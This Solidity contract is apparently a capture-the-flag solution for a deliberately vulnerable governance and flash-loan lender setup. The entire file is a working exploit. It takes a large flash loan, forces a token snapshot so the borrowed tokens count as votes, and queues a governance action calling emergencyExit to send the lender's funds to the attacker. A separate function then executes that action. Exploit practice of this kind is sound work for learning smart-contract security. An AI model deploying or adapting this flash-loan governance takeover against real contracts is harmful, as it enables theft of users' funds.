// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../ISimpleGovernance.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
/**
 * @title SimpleGovernanceAttacker
 * @author Caio Sá
 */

interface IToken {
    function snapshot() external returns (uint256 lastSnapshotId);
}
contract SimpleGovernanceAttacker is IERC3156FlashBorrower{

    ISimpleGovernance private immutable simple;
    IERC3156FlashLender private immutable selfie;
    IToken private immutable token;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    address private immutable owner;
    uint256 private actionId;
    uint256 public number = 1;

    constructor(address _simple, address _selfie, address _token) { 
        simple = ISimpleGovernance(_simple);
        selfie = IERC3156FlashLender(_selfie);
        token = IToken(_token);
        owner = msg.sender;
    }

    function attack() external {
        //request flashloan
        bytes memory data = abi.encode(number);
        selfie.flashLoan(IERC3156FlashBorrower(address(this)), address(token), 1500000 ether, data);
        ++number;
    }

    function onFlashLoan(
        address initiator,
        address _token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        //check sender
        token.snapshot();
        require(msg.sender == address(selfie),"!selfie");
        uint256 _number = abi.decode(data, (uint256));

        if(_number == 1) {
            //prepare
            bytes memory data = abi.encodeWithSignature("emergencyExit(address)", owner);
            actionId = simple.queueAction(address(selfie), 0, data);
        } 
        //"repay" flashloan
        IERC20(_token).approve(address(selfie), amount);
        return CALLBACK_SUCCESS;
    }

    function executing() external {
        simple.executeAction(actionId);
    }

}